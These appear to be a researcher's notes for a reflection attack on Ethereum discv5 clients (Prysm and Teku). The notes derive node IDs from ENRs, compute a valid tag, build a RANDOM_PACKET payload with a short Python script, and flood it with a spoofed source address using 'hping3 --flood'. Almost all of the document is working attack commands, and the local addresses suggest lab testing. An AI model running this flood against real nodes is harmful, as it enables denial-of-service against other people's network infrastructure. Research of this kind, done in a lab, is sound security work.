## Reflection Attack Notes



Start Prysm and get src node-id from ENR:
```bash
> SRC=$(rumor shell < <(sh nodeid-from-enr.sh $ENR_SRC)| tr -d '\r\n' | cut -d'=' -f15 | cut -d' ' -f1)
```
Start Teku and get dest node-id from ENR:
```bash
> DEST=$(rumor shell < <(sh nodeid-from-enr.sh $ENR_DEST)| tr -d '\r\n' | cut -d'=' -f15 | cut -d' ' -f1)
```

Derive tag from src node-id and dest node-id and dump to file:
```bash
> TAG=$(python src-id-from-tag.py src $(echo $SRC) $(echo $DEST))
```


Check that we can derive src node-id from dest node-id and tag.  (NOT REQUIRED)
```bash
> python src-id-from-tag.py dest $(echo $DEST) $(echo $TAG)
224487b067cbcaba99dc7b4477fb6085c06273f57101c58042125bba7dc9d6c3
```


Create RANDOM_PACKET payload with valid tag

```python
import binascii
 
with open('tag.payload') as f, open('payload.output', 'wb') as fout:
     for line in f:
         fout.write(
             binascii.unhexlify(''.join(line.split()))
         )

```

Send payload:

```bash

> sudo hping3 -d 46 --flood --udp -p 9000 -s 9001 -k -a 192.168.1.212 192.168.1.212 -J -E payload.output

```
